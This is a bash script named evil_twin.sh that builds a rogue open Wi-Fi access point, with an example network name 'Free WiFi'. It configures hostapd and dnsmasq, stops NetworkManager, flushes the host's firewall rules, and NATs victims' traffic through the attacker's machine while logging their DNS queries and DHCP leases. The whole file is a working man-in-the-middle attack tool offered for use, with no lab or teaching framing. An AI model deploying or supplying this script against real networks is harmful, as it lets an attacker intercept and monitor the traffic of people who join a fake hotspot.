#!/bin/bash
# evil_twin.sh - Create rogue access point

ESSID=${1}
CHANNEL=${2:-6}
INTERFACE="wlan1"  # Use built-in for AP
INTERNET_IFACE="wlan0"  # Built-in for internet

usage() {
    echo "Usage: $0 <essid> [channel]"
    echo "Example: $0 \"Free WiFi\" 6"
    exit 1
}

if [ "$#" -lt 1 ]; then
    usage
fi

echo "[*] Setting up Evil Twin AP"
echo "[*] ESSID: $ESSID"
echo "[*] Channel: $CHANNEL"

# Stop network manager
sudo systemctl stop NetworkManager 2>/dev/null

# Configure hostapd
sudo tee /etc/hostapd/hostapd.conf > /dev/null <<EOF
interface=$INTERFACE
driver=nl80211
ssid=$ESSID
hw_mode=g
channel=$CHANNEL
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
EOF

# Configure dnsmasq
sudo tee /etc/dnsmasq.conf > /dev/null <<EOF
interface=$INTERFACE
dhcp-range=10.0.0.10,10.0.0.100,12h
dhcp-option=3,10.0.0.1
dhcp-option=6,10.0.0.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
EOF

# Configure interface
sudo ifconfig "$INTERFACE" up
sudo ifconfig "$INTERFACE" 10.0.0.1 netmask 255.255.255.0

# Enable IP forwarding
sudo sysctl -w net.ipv4.ip_forward=1

# Configure NAT
sudo iptables --flush
sudo iptables --table nat --flush
sudo iptables --delete-chain
sudo iptables --table nat --delete-chain
sudo iptables -t nat -A POSTROUTING -o "$INTERNET_IFACE" -j MASQUERADE
sudo iptables -A FORWARD -i "$INTERFACE" -o "$INTERNET_IFACE" -j ACCEPT

# Start services
echo "[*] Starting dnsmasq..."
sudo dnsmasq -C /etc/dnsmasq.conf -d &

echo "[*] Starting hostapd..."
sudo hostapd /etc/hostapd/hostapd.conf

echo "[*] Evil Twin AP running"
echo "[*] Monitor with: sudo tail -f /var/log/syslog"